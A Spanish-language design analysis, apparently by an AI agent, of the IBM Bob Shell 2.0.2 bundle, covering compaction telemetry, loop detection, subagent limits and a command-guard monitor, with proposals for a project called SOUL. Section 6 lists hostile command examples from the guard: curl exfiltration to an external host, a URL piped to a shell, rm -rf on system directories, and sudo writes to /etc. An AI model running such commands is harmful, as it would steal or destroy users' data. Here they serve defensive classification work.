# IBM Bob Shell 2.0.2 — los ALGORITMOS por dentro, y qué le sirve a SOUL

**Pedido de William, 4-sep-2026 15:44 (DM):** *«analiza como funciona bob, escanea su codigo hasta la ultima gota, para saber que aprovechar en soul»*.

**Qué agrega este documento:** `bob_ingenieria_inversa.md` describe la ESTRUCTURA (de qué está hecho, qué herramientas tiene, qué rutas expone). Esto va a los **NÚMEROS y las REGLAS**: umbrales, contratos y prompts operativos. Son las decisiones que uno no puede adivinar leyendo una lista de módulos.

**La línea que no se cruza:** se estudia el DISEÑO. **Nada de esto se copia a SOUL.** La licencia IBM 5900-BVU lo prohíbe y, más importante, contaminaría el producto de William el día que salga al mercado. Las citas cortas de abajo son EVIDENCIA de lo medido, no material a pegar. Lo que se adopte se reescribe desde cero.

**Procedencia:** bundle `bobshell-2.0.2.tgz` bajado el 4-sep-2026 15:46 del bucket oficial, **SHA256 verificado contra el publicado por IBM**. Un solo archivo `dist/bob.js` de 18,1 MB, **cero dependencias** (todo empaquetado), `node >= 22`.

---

## 1. El panel de fábrica completo (`DEFAULT_BOB_CONFIG`)

```text
maxTurns .................... 100        maxCost ................. 0 (sin tope)
autoCondense ................ true       autoImagePrune .......... true
compactionThresholdPercent .. 90         maxReadFile ............. 500
mcp ......................... true       subagents ............... true
respectGitIgnore ............ false      limitWarnings ........... false
hooks: SessionStart · UserPromptSubmit · PreToolUse · PostToolUse · Stop
```

**Lo que dice de su diseño:** compacta al **90 %** de la ventana, no al 100. Y `maxTurns: 100` es un **techo duro por tarea**: la sesión se corta sola aunque el modelo quiera seguir.

**Para SOUL:** nosotros no tenemos ni umbral declarado ni techo de turnos. Un bucle nuestro se detiene cuando alguien lo nota.

## 2. Miden su propia compactación (esto es lo que más nos falta)

Métricas de telemetría, con estos nombres exactos:

```text
bob.compaction.messages_before   bob.compaction.messages_after
bob.compaction.summary_length    bob.compaction.threshold_percent
bob.compaction.cost              bob.compaction.duration_ms
bob.loop.exit_reason             bob.loop.turn_count   bob.loop.total_messages
```

**El hallazgo no es que compacten: es que INSTRUMENTAN la compactación.** Saben cuántos mensajes entraron, cuántos salieron, cuánto costó y cuánto tardó.

**Contraste medido hoy en SOUL:** nuestro hook post-compactación llevaba semanas devolviendo una sola línea de error y **nadie lo supo hasta que lo abrí**. No teníamos ninguna señal. **Ésta es la idea más barata y de mayor rendimiento de todo el análisis: instrumentar nuestra compactación con estas seis cifras.**

## 3. Qué conserva al compactar — y acá CORRIJO nuestro propio backlog

```text
summarizationMiddleware   strategy:"last"  allowPartial:true  includeSystem:true
fallback si algo falla    conservar los ULTIMOS 15 mensajes
```

**Busqué `firstUserMessage`, `originalRequest`, `preserveFirst` y equivalentes: NO EXISTEN en el bundle.**

**Esto refuta la premisa de nuestra tarea 1699**, que decía *«Bob conserva la petición original y lo reciente»*. Lo que Bob conserva es **un resumen más los últimos N**, igual que nosotros. La preservación del pedido original que implementé hoy (`aee903cf0`) **es una idea NUESTRA, no adoptada de Bob** — y sigue valiendo, pero hay que atribuirla bien.

**Lección de método, la tercera vez hoy:** medir la premisa antes de implementarla. Acá la premisa era falsa y el trabajo salió bien igual; en la tarea 1698 era falsa y me habría hecho reimplementar algo que el harness ya hacía.

## 4. Detección de bucles: dos niveles, con números

Literal del bundle, es la pieza más adoptable después de la telemetría:

```text
3 llamadas identicas -> aviso al modelo:
   "it has failed 3 times. Try a different tool or approach to solve this task."
5 llamadas identicas -> nivel CRITICO, y CORTA:
   "You have called this tool 5 times with identical arguments.
    The result will not change. Doom loop detected - stopping execution."
   log: level=critical identicalCalls=5
```

**El diseño que importa:** el nivel 3 **no interrumpe, redirige** — le dice al modelo que cambie de enfoque. El nivel 5 **fuerza la salida**. Dos escalones, no un interruptor.

**Para SOUL:** el 2-may-2026 NEXUS entró en un bucle de reflejos y publicó **199 mensajes en 60 segundos**; lo cortó JARVIS a mano matando el proceso. Con este mecanismo se habría cortado solo a la quinta repetición.

## 5. El contrato de los subagentes, en su propia descripción de herramienta

```text
- pasar el historial del padre al subagente SOLO cuando necesita contexto previo
- usar SOLO para trabajo lateral autocontenido cuyo resultado se pueda resumir de vuelta
- NO usar para busquedas simples, lecturas de archivo o consultas rapidas,
  ni para trabajo que el padre deba integrar directamente
- varios subagentes lanzados en el mismo turno corren EN PARALELO
- un subagente NO puede lanzar otros subagentes
```

**La última regla es la que nos falta y es una regla de seguridad, no de estilo:** sin ella, un árbol de subagentes se multiplica sin techo.

## 6. Guardián de comandos por INTENCIÓN — el prompt real

Es la idea 1 del backlog, **la que sigue esperando el sí explícito de William**. Ahora tengo su diseño medido, no inferido.

**El encuadre, que es el 80 % del valor:**

> *«You are NOT a generic malware scanner — you are detecting commands that cause unintended harm BEYOND the user's intent»*

Y enumera qué es daño más allá de la intención: mandar datos a servidores que el usuario no quiso contactar, acceder a almacenes de credenciales **para exfiltrarlas, no para usarlas localmente**, destruir archivos que no se quiso borrar, u obtener privilegios más allá de lo que la tarea requiere.

**Cinco categorías, y CADA UNA trae su lista explícita de lo que NO es peligroso:**

| categoría | ejemplo PELIGROSO | ejemplo INOFENSIVO declarado |
|---|---|---|
| credenciales | leer un almacén para exfiltrarlo | `ssh -i ~/.ssh/key`, `cat .env` de uso local, `known_hosts`, `--kubeconfig` |
| exfiltración | `cat local \| curl -X POST https://externo` | descargas normales |
| ejecución remota | salida de una URL **canalizada a `sh`/`bash`/`python`** | `npm install`, `pip install`, `uv run`, `npx playwright install` |
| destructivas | `rm -rf` sobre `/`, `/usr`, `/etc`, `/home`, `~`, `/var`, `/boot` | **`rm -rf ./build`, `rm -rf` de un subdirectorio del proyecto o un temporal** |
| escalada | `sudo` escribiendo en `/etc`, `/usr`, `/boot`, `/sys`; `kextload`, `modprobe`, `insmod` | borrar un pod para reiniciarlo, **salvo** en espacios críticos (`kube-system`, `openshift-etcd`, `openshift-apiserver`, `openshift-machine-config-operator`) |

**Por qué esto nos importa exactamente a nosotros.** Nuestro candado mira la **FORMA** del comando (una variable con glob) y por eso el 1-sep dejó **mudos a ALICE (13:35) y a JARVIS (15:34)**, y a NEXUS dos veces más, por limpiar directorios temporales. Ninguno desobedeció: la regla no distingue un borrado peligroso de uno rutinario.

**Bob distingue textualmente `rm -rf ./build` de `rm -rf /home`.** Ésa es la diferencia entre un candado que protege y uno que enmudece al equipo.

**No arranco esto sin la palabra de William**, porque es lo único del backlog que toca el candado destructivo.

## 7. Límites de salida (confirmación con el número de fábrica)

```text
maxReadFile ................ 500 lineas (config por defecto)
herramientas MCP ........... 2x MAX_OUTPUT_BYTES  <- el doble que las nativas
truncateOutput ............. recorta por bytes y marca `truncated`
```

**Nota de honestidad, medida hoy:** la idea 13 («guardar la salida completa y mandar el recorte con un puntero») **ya la hace nuestro harness de Claude Code** — 113,3 KB guardados en disco, 2 KB de preview con la ruta. No hay nada que adoptar ahí, y por eso la tarea 1698 cerró retirando código muerto en vez de escribiendo código nuevo.

---

## 8. Qué adoptar, en orden de rendimiento sobre esfuerzo

1. **Instrumentar la compactación** con las seis cifras de la §2. Es barato y hoy volamos a ciegas.
2. **Detección de bucles en dos escalones** (§4), con el aviso que redirige a las 3 y el corte a las 5. Tenemos el incidente de las 199 publicaciones como caso de prueba.
3. **`maxTurns` y umbral de compactación declarados** (§1), en vez de implícitos.
4. **Regla dura: un subagente no lanza subagentes** (§5).
5. **Guardián por intención con lista explícita de lo inofensivo** (§6) — **espera autorización de William.**

## 9. Qué NO adoptar

- La preservación del pedido original **no es de Bob** (§3): es nuestra. Ya está en `aee903cf0`.
- El recorte con puntero al original (§7): **el harness ya lo hace**.

## 10. Reproducir

```bash
D=$(mktemp -d)
B=https://s3.us-south.cloud-object-storage.appdomain.cloud/bob-shell
V=$(curl -sL $B/bobshell2-version.txt | tr -d '[:space:]')
curl -sL -o "$D/bobshell-$V.tgz" "$B/bobshell-$V.tgz"
diff <(curl -sL "$B/bobshell-$V.tgz.sha256" | awk '{print $1}') \
     <(sha256sum "$D/bobshell-$V.tgz" | awk '{print $1}') && echo SHA256 OK
tar -xzf "$D/bobshell-$V.tgz" -C "$D"   # todo vive en package/dist/bob.js
```

**Límite de esta evidencia:** es lectura estática del bundle. Un valor por defecto en la configuración no prueba que la instalación de William use ese valor, y una cadena en un prompt no prueba con qué modelo se evalúa ni con qué latencia. Lo de la §6 y la §4 son textos del propio bundle; lo de la §1 y §7 son valores de fábrica.
